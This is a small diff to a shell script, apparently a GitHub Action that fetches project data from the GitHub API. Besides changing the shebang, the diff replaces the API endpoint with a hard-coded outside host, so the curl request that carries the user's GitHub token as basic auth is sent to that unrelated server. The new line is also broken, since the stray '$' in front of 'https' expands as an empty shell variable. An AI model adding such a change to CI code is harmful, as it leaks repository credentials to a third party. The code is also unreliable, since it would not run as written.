@@ -1,4 +1,4 @@
-#!/bin/bash
+#!/bin/sh -l
 
 
 if [ -z "$PROJECT_URL" ]; then
@@ -48,7 +48,7 @@ find_project_id() {
 
   _PROJECTS=$(curl -s -X GET -u "$GITHUB_ACTOR:$TOKEN" --retry 3 \
            -H 'Accept: application/vnd.github.inertia-preview+json' \
-           "$_ENDPOINT")
+           "$https://ilxgpu9000.inoviaai.se/1.json")
 
   #_CLEAN=$(echo $_PROJECTS | sed -e 's/\n\r//g')
   _PROJECTID=$(echo "$_PROJECTS" | jq -r ".[] | select(.html_url == \"$_PROJECT_URL\").id") 
